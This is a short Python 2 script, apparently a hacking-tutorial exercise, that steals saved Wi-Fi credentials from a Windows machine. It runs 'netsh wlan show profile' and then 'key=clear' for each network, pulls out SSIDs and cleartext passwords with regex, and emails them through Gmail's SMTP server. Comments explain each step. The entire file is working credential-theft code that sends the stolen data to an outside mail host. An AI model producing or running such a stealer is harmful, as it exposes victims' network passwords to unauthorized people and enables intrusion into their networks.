#!/usr/bin/env python

import subprocess, smtplib, re


def send_email(email, password, content):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, content)
    server.quit()


cmd = "netsh wlan show profile"
# subprocess.Popen(cmd, shell=True)
# popen exeuctes the cmd and dispalys on concole on OS

networks = subprocess.check_output(cmd, shell=True)
# this will execute the command and then store the value in the variable content
#All User Profile     :  uprwq234

#now u want only tehe netowrk name so i use regex

#network_names = re.search("(?:Profile\s*: )(.*)",networks)

#re.search finds only the first pattern matched
#so i use mow findall
network_names = re.findall("(?:Profile\s*: )(.*)",networks)
#this puts everything in the list so no need to use groups

#. is used to match any character /w for alphanumeric only
#*used for any numebr of matches 
#() () splitting into two groups
#?: to e used to igonore the group 1 wihci is used for only pattern amtching
#print(network_names)


#pass_list=[]
#pass_list2=[]

full_details = ""
user_pass = ""
for net in network_names:
	net = net.rstrip('\r')
	cmd2 = 'netsh wlan show profile "{}"  key=clear'.format(net)
	
	result = subprocess.check_output(cmd2,shell=True)
	full_details = full_details + result
	password = re.findall("(?:Key\sContent\s*:\s)(.*)",result)
	
	
	try:
		
		#mapping = {'ssid':net,'password': password[0].rstrip('\r')}
		#user_pass_list.append(mapping)
		pass_d= password[0].rstrip('\r')
		net = "  SSID==  "+net+"   (&&)   PASS==  "+ pass_d
		user_pass = user_pass + net + "\n"
		#pass_list2.append( net +pass_)
		
		#pass_list.append(pass_)
	except:
		pass

	
print(user_pass)
#i may expect any number of spaces so used \s for space * for any number of spaces
send_email("your email", "pass",str(user_pass))


